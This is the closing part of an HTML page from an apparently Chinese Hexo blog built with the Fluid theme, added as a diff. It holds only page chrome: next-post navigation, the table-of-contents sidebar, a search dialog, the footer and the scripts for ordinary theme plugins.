+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/13/%E4%BA%91%E5%AE%89%E5%85%A8/" title="云安全">
+                        <span class="hidden-mobile">云安全</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/z2z_custom/custom.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":240,"height":480},"mobile":{"show":false},"react":{"opacityDefault":1,"opacityOnHover":1},"log":false,"tagMode":false});</script></body>
+</html>
+
+
+
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+
+<!-- 页面点击小红心，在末尾添加，避免找不到 -->
+<script type="text/javascript" src="/js/click.js"></script>
+
+
